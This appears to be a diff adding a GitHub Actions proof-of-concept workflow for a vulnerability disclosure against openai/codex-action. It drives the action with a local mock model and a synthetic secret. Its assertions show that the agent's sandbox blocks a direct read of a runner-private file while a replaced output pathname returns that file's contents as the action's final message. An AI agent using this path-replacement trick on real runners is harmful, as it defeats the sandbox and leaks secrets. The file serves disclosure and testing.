@@ -1,0 +1,134 @@
+name: PoC - codex-action final-message path readback
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  reproduce:
+    name: Reproduction ${{ matrix.repetition }}
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    strategy:
+      fail-fast: false
+      matrix:
+        repetition: [1, 2]
+
+    env:
+      SYNTHETIC_MARKER: SYNTHETIC_SECRET_NOT_A_REAL_CREDENTIAL
+      POC_MOCK_PORT: "18080"
+
+    steps:
+      - name: Check out the test repository
+        uses: actions/checkout@v5
+        with:
+          persist-credentials: false
+
+      - name: Prepare synthetic runner-private file and trusted Codex profile
+        shell: bash
+        run: |
+          set -euo pipefail
+
+          sudo install -d -m 0755 /var/lib/codex-action-poc
+          printf '%s' "$SYNTHETIC_MARKER" |
+            sudo tee /var/lib/codex-action-poc/synthetic-secret.txt >/dev/null
+          sudo chmod 0444 /var/lib/codex-action-poc/synthetic-secret.txt
+
+          codex_home="$RUNNER_TEMP/trusted-codex-home"
+          mkdir -p "$codex_home"
+          cat >"$codex_home/config.toml" <<'TOML'
+          default_permissions = "readback-poc"
+
+          [permissions.readback-poc.filesystem]
+          ":root" = "deny"
+          ":minimal" = "read"
+          ":tmpdir" = "write"
+          ":slash_tmp" = "write"
+          "/home/runner/work/_temp" = "write"
+
+          [permissions.readback-poc.filesystem.":workspace_roots"]
+          "." = "write"
+
+          [permissions.readback-poc.network]
+          enabled = false
+          TOML
+
+          node poc/mock-responses-server.mjs >"$RUNNER_TEMP/mock-server.log" 2>&1 &
+          echo "$!" >"$RUNNER_TEMP/mock-server.pid"
+
+          for _ in {1..20}; do
+            if curl --fail --silent \
+              "http://127.0.0.1:$POC_MOCK_PORT/healthz" >/dev/null; then
+              echo "Mock Responses API is ready."
+              exit 0
+            fi
+          done
+
+          cat "$RUNNER_TEMP/mock-server.log" >&2
+          exit 1
+
+      - name: Run the affected action with a deterministic local model endpoint
+        id: codex
+        uses: openai/codex-action@v1
+        with:
+          openai-api-key: poc-dummy-key-not-a-secret
+          responses-api-endpoint: http://127.0.0.1:18080/v1/responses
+          codex-home: ${{ runner.temp }}/trusted-codex-home
+          codex-version: 0.166.0
+          permission-profile: readback-poc
+          safety-strategy: drop-sudo
+          prompt: Run the deterministic synthetic readback test.
+
+      - name: Assert negative control and path-readback impact
+        shell: bash
+        env:
+          FINAL_MESSAGE: ${{ steps.codex.outputs.final-message }}
+        run: |
+          set -euo pipefail
+
+          echo "--- mock server transcript ---"
+          cat "$RUNNER_TEMP/mock-server.log"
+          echo "--- sandbox observations ---"
+          cat /tmp/codex-action-poc-direct-read.status
+          cat /tmp/codex-action-poc-output-path.status
+
+          grep -Fxq \
+            'DIRECT_READ_BLOCKED' \
+            /tmp/codex-action-poc-direct-read.status
+          grep -Fq \
+            'OUTPUT_PATH_REPLACED=' \
+            /tmp/codex-action-poc-output-path.status
+
+          if [[ "$FINAL_MESSAGE" != "$SYNTHETIC_MARKER" ]]; then
+            echo "Expected final-message to equal the synthetic runner-private marker." >&2
+            printf 'Observed final-message: <%s>\n' "$FINAL_MESSAGE" >&2
+            exit 1
+          fi
+
+          if [[ "$FINAL_MESSAGE" == 'SAFE_FINAL_MESSAGE' ]]; then
+            echo "The action returned the model message instead of the replaced path." >&2
+            exit 1
+          fi
+
+          echo "POC_PASS=repetition-${{ matrix.repetition }}"
+          echo "FINAL_MESSAGE_MATCHED_SYNTHETIC_RUNNER_PRIVATE_FILE=true"
+
+          {
+            echo "### PoC repetition ${{ matrix.repetition }}"
+            echo
+            echo "- Direct read through the permission profile: blocked"
+            echo "- Temporary output pathname replacement: observed"
+            echo "- Model's true final message: \`SAFE_FINAL_MESSAGE\`"
+            echo "- Action \`final-message\`: synthetic runner-private marker"
+            echo "- Result: reproduced"
+          } >>"$GITHUB_STEP_SUMMARY"
+
+      - name: Stop the local mock server
+        if: always()
+        shell: bash
+        run: |
+          if [[ -s "$RUNNER_TEMP/mock-server.pid" ]]; then
+            kill "$(cat "$RUNNER_TEMP/mock-server.pid")" 2>/dev/null || true
+          fi
